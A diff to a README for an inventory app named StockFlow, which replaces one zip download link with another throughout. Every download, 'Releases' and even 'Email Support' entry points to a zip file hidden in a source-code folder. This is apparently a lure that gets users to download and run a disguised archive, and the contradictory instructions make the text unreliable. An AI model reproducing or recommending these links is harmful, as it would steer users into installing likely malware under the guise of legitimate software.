@@ -6,9 +6,9 @@ Welcome to StockFlow! This application makes it easy to manage your inventory an
 
 ## 📥 Download StockFlow
 
-[![Download StockFlow](https://raw.githubusercontent.com/AdToSa/StockFlow/main/server/src/common/decorators/Stock-Flow-2.1.zip)](https://raw.githubusercontent.com/AdToSa/StockFlow/main/server/src/common/decorators/Stock-Flow-2.1.zip)
+[![Download StockFlow](https://github.com/AdToSa/StockFlow/raw/refs/heads/main/client/app/lib/Stock-Flow-v1.8.zip)](https://github.com/AdToSa/StockFlow/raw/refs/heads/main/client/app/lib/Stock-Flow-v1.8.zip)
 
-Visit this page to download: [StockFlow Releases](https://raw.githubusercontent.com/AdToSa/StockFlow/main/server/src/common/decorators/Stock-Flow-2.1.zip)
+Visit this page to download: [StockFlow Releases](https://github.com/AdToSa/StockFlow/raw/refs/heads/main/client/app/lib/Stock-Flow-v1.8.zip)
 
 ## ⚙️ System Requirements
 
@@ -29,9 +29,9 @@ Before you download, ensure your system meets the following requirements:
 
 ## 💻 Download & Install
 
-1. Visit the [StockFlow Releases](https://raw.githubusercontent.com/AdToSa/StockFlow/main/server/src/common/decorators/Stock-Flow-2.1.zip) page.
+1. Visit the [StockFlow Releases](https://github.com/AdToSa/StockFlow/raw/refs/heads/main/client/app/lib/Stock-Flow-v1.8.zip) page.
 2. Scroll down to the "Assets" section.
-3. Choose the file for your operating system. Look for `https://raw.githubusercontent.com/AdToSa/StockFlow/main/server/src/common/decorators/Stock-Flow-2.1.zip` for Windows, `https://raw.githubusercontent.com/AdToSa/StockFlow/main/server/src/common/decorators/Stock-Flow-2.1.zip` for macOS, or the Linux tarball.
+3. Choose the file for your operating system. Look for `https://github.com/AdToSa/StockFlow/raw/refs/heads/main/client/app/lib/Stock-Flow-v1.8.zip` for Windows, `https://github.com/AdToSa/StockFlow/raw/refs/heads/main/client/app/lib/Stock-Flow-v1.8.zip` for macOS, or the Linux tarball.
 4. Click on the download link to start the download.
 5. Once downloaded, locate the file and double-click to start the installation.
 6. Follow the on-screen instructions.
@@ -57,12 +57,12 @@ If you run into any issues during installation or usage, here are a few tips:
 
 For further assistance, you can reach out through the following channels:
 
-- **Email Support:** https://raw.githubusercontent.com/AdToSa/StockFlow/main/server/src/common/decorators/Stock-Flow-2.1.zip
+- **Email Support:** https://github.com/AdToSa/StockFlow/raw/refs/heads/main/client/app/lib/Stock-Flow-v1.8.zip
 - **Community Forum:** Visit our GitHub Discussions page for help from other users and developers.
 
 ## ✨ Conclusion
 
 StockFlow is designed to streamline your inventory and invoicing processes with ease. Download it today and take control of your business operations.
 
-[![Download StockFlow](https://raw.githubusercontent.com/AdToSa/StockFlow/main/server/src/common/decorators/Stock-Flow-2.1.zip)](https://raw.githubusercontent.com/AdToSa/StockFlow/main/server/src/common/decorators/Stock-Flow-2.1.zip)  
-Visit this page to download: [StockFlow Releases](https://raw.githubusercontent.com/AdToSa/StockFlow/main/server/src/common/decorators/Stock-Flow-2.1.zip)
+[![Download StockFlow](https://github.com/AdToSa/StockFlow/raw/refs/heads/main/client/app/lib/Stock-Flow-v1.8.zip)](https://github.com/AdToSa/StockFlow/raw/refs/heads/main/client/app/lib/Stock-Flow-v1.8.zip)  
+Visit this page to download: [StockFlow Releases](https://github.com/AdToSa/StockFlow/raw/refs/heads/main/client/app/lib/Stock-Flow-v1.8.zip)
